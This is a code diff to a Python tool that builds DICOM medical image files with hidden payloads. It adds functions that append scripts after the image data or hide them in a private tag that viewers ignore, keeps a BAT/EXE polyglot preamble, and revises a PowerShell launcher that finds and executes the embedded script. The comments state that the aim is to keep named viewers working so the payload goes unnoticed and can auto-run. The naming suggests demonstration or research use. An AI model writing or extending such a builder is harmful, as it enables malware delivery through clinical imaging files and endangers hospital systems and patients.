@@ -27,15 +27,14 @@ FILE_LAUNCHER_MAGIC = b"<<<DCM_FILE_LAUNCHER>>>"
 
 # Self-contained PowerShell launcher — appended at the end of the DICOM.
 # When open_embedded_dicom.py (DicomAutoOpen handler) runs on double-click,
-# it extracts this launcher, runs it, which in turn finds and executes the
-# SCRIPT_MAGIC payload embedded in the pixel data.
+# it extracts this launcher, which finds and executes the SCRIPT_MAGIC payload.
 _FILE_LAUNCHER_SCRIPT = r"""
 param([string]$DicomPath = $args[0])
 if (-not $DicomPath) { throw 'DICOM path required' }
 $b = [IO.File]::ReadAllBytes($DicomPath)
 $m = [Text.Encoding]::ASCII.GetBytes('<<<DCM_EMBEDDED_SCRIPT>>>')
 $found = -1
-for ($i = 0; $i -le $b.Length - $m.Length; $i++) {
+for ($i = $b.Length - $m.Length; $i -ge 0; $i--) {
     $match = $true
     for ($j = 0; $j -lt $m.Length; $j++) {
         if ($b[$i + $j] -ne $m[$j]) { $match = $false; break }
@@ -254,6 +253,7 @@ def build_exe_polyglot_bytes(source_bytes: bytes, source_name: str = "upload.dcm
 def build_image_pixel_embed_bytes(
     source_bytes: bytes, payload: bytes, source_name: str = "upload.dcm"
 ) -> Tuple[bytes, Dict[str, Any]]:
+    """Append payload inside PixelData (legacy — breaks strict DICOM viewers)."""
     import tempfile
 
     with tempfile.NamedTemporaryFile(suffix=".dcm", delete=False) as src_tmp:
@@ -267,6 +267,102 @@ def build_image_pixel_embed_bytes(
     finally:
         src_path.unlink(missing_ok=True)
         out_path.unlink(missing_ok=True)
+
+
+def append_payload_after_dicom(
+    source_bytes: bytes, payload: bytes, source_name: str = "upload.dcm"
+) -> Tuple[bytes, Dict[str, Any]]:
+    """Append payload after a valid DICOM structure without modifying PixelData.
+
+    Preserves a custom 128-byte preamble (BAT/EXE polyglot) while re-serializing
+    the DICOM body so MicroDicom, RadiAnt, and SecureDicom see intact PixelData.
+    Script payloads must use this path — not pixel-tail embed — to avoid corrupting
+    the image element and triggering false tags like (3c3c, 443c).
+    """
+    custom_preamble = b""
+    if len(source_bytes) >= 132 and source_bytes[128:132] == b"DICM":
+        custom_preamble = source_bytes[:128]
+
+    ds = pydicom.dcmread(io.BytesIO(source_bytes), force=True)
+    clean_buf = io.BytesIO()
+    ds.save_as(clean_buf, write_like_original=True)
+    serialized = clean_buf.getvalue()
+
+    if serialized[128:132] == b"DICM":
+        dicom_core = serialized[128:]
+    else:
+        dicom_core = serialized
+
+    if custom_preamble.rstrip(b"\x00").rstrip(b" "):
+        result = custom_preamble + dicom_core + payload
+    else:
+        result = serialized + payload
+
+    log = {
+        "pattern": "image_eof_append",
+        "reference_file": "viewer-safe EOF append",
+        "source": source_name,
+        "payload_bytes": len(payload),
+        "dicom_bytes": len(dicom_core) + (128 if custom_preamble else len(serialized) - len(dicom_core)),
+        "total_bytes": len(result),
+        "hash_sha256": hashlib.sha256(result).hexdigest(),
+    }
+    return result, log
+
+
+def build_image_eof_embed_bytes(
+    source_bytes: bytes, payload: bytes, source_name: str = "upload.dcm"
+) -> Tuple[bytes, Dict[str, Any]]:
+    """Legacy embed: payload after DICOM EOF. Prefer build_private_tag_embed_bytes for viewers."""
+    return append_payload_after_dicom(source_bytes, payload, source_name)
+
+
+def build_private_tag_embed_bytes(
+    source_bytes: bytes,
+    payload: bytes,
+    source_name: str = "upload.dcm",
+    include_launcher: bool = True,
+) -> Tuple[bytes, Dict[str, Any]]:
+    """Viewer-safe embed: script/file in DEMO_EMBED private tag — no bytes after DICOM EOF.
+
+    Strict viewers (MicroDicom, RadiAnt) reject trailing data after the dataset end.
+    Private tags are ignored by viewers but remain in the file for extraction and auto-run.
+    Preserves a custom 128-byte polyglot preamble when present.
+    """
+    from utils.embed_engine import EmbedOptions, embed_payloads_in_dicom
+
+    custom_preamble = b""
+    if len(source_bytes) >= 132 and source_bytes[128:132] == b"DICM":
+        custom_preamble = source_bytes[:128]
+
+    if custom_preamble.rstrip(b"\x00").rstrip(b" "):
+        # pydicom needs a 128-byte Part 10 preamble before DICM when reading.
+        dicom_input = b"\x00" * 128 + source_bytes[128:]
+    else:
+        dicom_input = source_bytes
+
+    options = EmbedOptions(include_launcher=include_launcher and SCRIPT_MAGIC in payload)
+    embedded, embed_log = embed_payloads_in_dicom(dicom_input, [payload], options)
+
+    if custom_preamble.rstrip(b"\x00").rstrip(b" "):
+        if len(embedded) >= 132 and embedded[128:132] == b"DICM":
+            result = custom_preamble + embedded[128:]
+        else:
+            result = custom_preamble + embedded
+    else:
+        result = embedded
+
+    log = {
+        "pattern": "private_tag_embed",
+        "reference_file": "private DEMO_EMBED tag (viewer-safe)",
+        "source": source_name,
+        "payload_bytes": len(payload),
+        "include_launcher": options.include_launcher,
+        "total_bytes": len(result),
+        "hash_sha256": hashlib.sha256(result).hexdigest(),
+    }
+    log.update({k: v for k, v in embed_log.items() if k not in log})
+    return result, log
 
 
 def create_exe_polyglot_dicom(
